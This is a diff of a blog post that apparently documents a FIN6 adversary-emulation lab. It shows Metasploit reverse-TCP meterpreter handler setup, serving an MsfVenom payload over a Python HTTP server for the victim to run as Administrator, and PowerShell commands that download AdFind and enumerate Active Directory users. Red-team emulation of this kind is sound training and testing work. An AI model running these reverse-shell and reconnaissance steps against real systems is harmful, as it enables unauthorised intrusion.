@@ -82,9 +82,9 @@ Base on the result, the payload is currently set to default <kbd>generic/shell_r
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 ```
 
-Aside from that, thae `LHOST` needs to be set also. We don’t need to set `LPORT` because it already matches the option we set for the payload.
+Aside from that, we can also see that `LHOST` needs to be set. We don’t need to set `LPORT` because it already matches the option we set for the payload.
 
-We can set the `LHOST` option using the following command:
+We can set the LHOST option with the following command:
 
 ```bash
 set LHOST [Attacker IP]
@@ -102,51 +102,43 @@ msf6 exploit(multi/handler) > exploit
 
 ### 1.4 - Tranfser the Payload via Server
 
-After generating the payload using MsfVenom, the next step is to set up an HTTP server to transfer the payload. To do this, follow these steps:
+Next, we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 
 
-Open another terminal tab or window to keep the current session active.
-
-Navigate to the folder location where you saved the payload using the cd command. For example:
+Open another terminal tab, then navigate to the folder location of the payload:
 
 ```bash
-cd /path/to/folder
+cd /tmp/
 ```
 
-Start the HTTP server in the same terminal tab by using a command like python if you have Python installed:
+Start a Python3 HTTP server on port 80:
 
 ```bash
 sudo python3 -m http.server 80
 ```
 
-or <kbd>http.server</kbd> if you are using Python 3:
-
-```bash
-sudo python3 -m http.server 8080
-```
-
 ### 1.5 - Download Payload to Start the Communication on Exploit Handler
 
-Switch to the victim's Server, then use a web browser to access the attacker's VM IP address and download the payload..
+Switch to the victim's Server. Open a browser and navigate to to the attackerVM IP address to download the payload to the Desktop.
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Download_MsfVenom_Payload.png){:width="100%"}
 
 Once downloaded, execute the payload as Administrator. Since as parts of this emulation plan, the payload requires elevated access. 
 
-Then switch back to the <kbd>msfconsole</kbd> terminal window on the attackerVM. You should observe that the handler has received a callback from the victim's server, resulting in the creation of a new meterpreter session.
+Then switch back to the `msfconsole` terminal window on the attackerVM. You should see that the handler received a callback from the victim's Server, with a new meterpreter session created.
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Established_MsfVenom_Payload.png){:width="100%"}
 
 ## Step 2 - Discovery
 
-After successfully infiltrating the target network, FIN6 proceeds with network and Active Directory (AD) environment enumeration. The primary objective during this phase is to conduct internal reconnaissance. The purpose of this discovery process is to identify potential opportunities for escalation of privileges, lateral movement within the network, systems that can be used for staging attacks, and systems of particular interest that will be targeted during the effects phase of the emulation. This comprehensive exploration of the network allows FIN6 to gather critical information to advance their attack and achieve their goals within the compromised environment.
+After gaining access to the target network, FIN6 enumerates the network and Active Directory (AD) environment. The second objective is to conduct internal reconnaissance. The intent of Discovery is to identify opportunities for escalation, lateral movement, systems for staging, and systems of interest for the effects phase of the emulation. 
 
 ### 2.1 - Software: AdFind [**S0552**](https://attack.mitre.org/software/S0552/)
 
-Indeed, FIN6 is suspected to have utilized a tool called ADFind for performing network and Active Directory (AD) enumeration on at least one occasion. ADFind is a command-line utility used to search and query Active Directory environments. By employing this tool, FIN6 can efficiently gather information about users, groups, computers, organizational units, and other objects within the AD infrastructure, enabling them to gain valuable insights for their malicious activities and further advance their attack objectives.
+FIN6 is believed to have used ADFind for this purpose on at least one occasion. 
 
 [**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a free command-line query tool that can be used for gathering information from Active Directory.
 
-On the <kbd>meterpreter></kbd> terminal,  we will use a PowerShell session instead to download AdFind to the Windows directory. To enable the PowerShell session, execute the following commands:
+On the <kbd>meterpreter></kbd> terminal, we will use PowerShell session instead to download AdFind on Windows directory. To enable PowerShell session, run the following commands:
 
 ```bash
 meterpreter > load powershell
@@ -155,7 +147,7 @@ meterpreter > powershell_shell
 PS > 
 ```
 
-Afterward, execute the following command to initiate the installation process of AdFind on the victim machine:
+Afterwards, execute the following command to start the installation process of AdFind on the target machine:
 
 ```ps
 $postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
@@ -166,7 +158,7 @@ Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Bo
 
 ### 2.2 - Account Discovery: Domain Account [**T1087.002**](https://attack.mitre.org/techniques/T1087/002/)
 
-FIN6 employed AdFind to search for person objects in Active Directory and saved the results to a text file.
+FIN6 used AdFind to check for person objects on Active Directory, and output the results to a text file.
 
 ```ps
 PS > adfind.exe -f "objectcategory=person" > ad_users.txt
